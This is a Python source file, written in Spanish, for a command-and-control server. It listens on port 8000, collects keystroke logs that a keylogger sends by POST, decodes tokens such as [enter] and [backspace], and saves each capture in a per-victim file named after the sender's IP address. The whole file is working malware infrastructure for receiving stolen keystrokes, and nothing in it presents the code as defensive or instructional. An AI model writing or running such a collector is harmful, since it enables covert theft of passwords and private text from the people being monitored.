from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import datetime
import os
import threading

HOST = '0.0.0.0'
PORT = 8000
LOG_DIR = 'capturas'

os.makedirs(LOG_DIR, exist_ok=True)

lock = threading.Lock()
contador = {'total': 0, 'bytes': 0}


def hacer_legible(texto):
    return (texto
            .replace('[space]', ' ')
            .replace('[enter]', '\n')
            .replace('[tab]', '\t')
            .replace('[backspace]', ''))


class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length).decode('utf-8', errors='replace')
            ip = self.client_address[0]
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            with lock:
                contador['total'] += 1
                contador['bytes'] += len(data)

                print(f"\n[{timestamp}] [+] Datos recibidos de {ip}")
                print(f"[*] Tamaño: {len(data)} bytes | Total: {contador['total']} envíos")
                print("-" * 50)
                print(hacer_legible(data)[:800])
                print("-" * 50)

                safe_ip = ip.replace(':', '_')
                archivo = os.path.join(LOG_DIR, f"victima_{safe_ip}.txt")
                with open(archivo, 'a', encoding='utf-8') as f:
                    f.write(f"=== {timestamp} ===\n{hacer_legible(data)}\n\n")

            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"OK")
        except Exception as e:
            print(f"[-] Error en POST: {e}")
            self.send_response(500)
            self.end_headers()

    def log_message(self, format, *args):
        pass


def main():
    server = ThreadingHTTPServer((HOST, PORT), C2Handler)
    print("=" * 50)
    print(f"[*] C2 escuchando en http://{HOST}:{PORT}/upload")
    print(f"[*] Logs guardados en ./{LOG_DIR}/")
    print("[*] Ctrl+C para detener")
    print("=" * 50)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n[*] Detenido. Total: {contador['total']} envíos.")


if __name__ == "__main__":
    main()
